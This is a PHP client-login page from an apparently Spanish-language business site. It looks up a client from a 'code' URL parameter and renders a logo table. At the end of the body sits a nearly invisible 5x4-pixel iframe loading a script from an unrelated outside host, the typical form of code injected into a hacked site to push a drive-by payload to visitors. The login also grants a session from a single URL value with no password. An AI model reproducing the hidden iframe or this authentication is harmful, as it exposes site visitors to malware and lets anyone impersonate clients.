<?
	if (!$_GET["code"]){
		header ("location: error.php");
		exit();
	}

	include '../../classes/clsSqlServer.php';
	include '../../classes/clsClientes.php';

	$SqlSrv = new SqlServer();
	$ManCli	= new ManagerClientes();
		
	$SqlSrv->dbConnect();
	
	$code = split("-", $_GET["code"]);

	$Sql_result = $ManCli->GetClienteFront($code[0], $code[1]);
	$total = $SqlSrv->dbNumRows($Sql_result);

	if ($total==0){
		header ("location: error.php");
		exit();
	}
			
	$row = mysql_fetch_array($Sql_result);

	$id			= $row['id'];
	$cliente	= $row['cliente'];
	
	session_start();
	
	session_register("idUser");
	session_register("nombreUser");
	
	$_SESSION['idUser']			= $id;
	$_SESSION['nombreUser']		= $cliente;
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<title>M S A</title>
<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../css/clientes.css">

</HEAD>

<BODY>

<div class="marco">

<TABLE border="0" cellpadding="0" cellspacing="0" width="776">
	<TR valign="top">
		<TD rowspan="2"><img src="../images/clientes/mdtlogo.gif" width="239" height="175" hspace="5" vspace="5" USEMAP="#mdtlogo[1].gif" border="0"></TD>
		<TD bgcolor="#666666">&nbsp;</TD>
		<TD bgcolor="#999999"><img src="../images/clientes/archivos.gif" width="99" height="27"></TD>
	</TR>
	<TR valign="top">
		<TD width="40" bgcolor="#A5A5A5">&nbsp;</TD>
		<TD style="padding: 5px;"></TD>
	</TR>
</TABLE>

<!-- <TABLE border="0" cellpadding="0" cellspacing="0" width="776">
	<TR>
		<TD height="86"><img src="../images/clientes/top.gif" width="776" height="86"></TD>
	</TR>
</TABLE>
<TABLE border="0" cellpadding="0" cellspacing="0" width="776">
	<TR>
		<TD width="44">&nbsp;</TD>
		<TD width="53" bgcolor="#666666"></TD>
		<TD width="679" bgcolor="#999999"><img src="../images/clientes/archivos.gif" width="99" height="27"></TD>
	</TR>
</TABLE>
<TABLE border="0" cellpadding="0" cellspacing="0" width="776" height="437">
	<TR valign="top">
		<TD width="44">&nbsp;</TD>
		<TD width="53" bgcolor="#A5A5A5"><img src="../images/clientes/mundo.jpg" width="53" height="215"></TD>
		<TD width="679" class="agua" align="right">
		
		</TD>
	</TR>
</TABLE> -->
</div>

<MAP NAME="mdtlogo[1].gif">
<AREA SHAPE=RECT COORDS="1,0,238,56" href="http://www.mdtmdt.com/index.php?socio=mdt" target="_blank">
<AREA SHAPE=RECT COORDS="1,57,238,116" href="http://www.mdtmdt.com/index.php?socio=sou" target="_blank">
<AREA SHAPE=RECT COORDS="1,117,238,174" href="http://www.mdtmdt.com/index.php?socio=alv" target="_blank">
</MAP>			

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
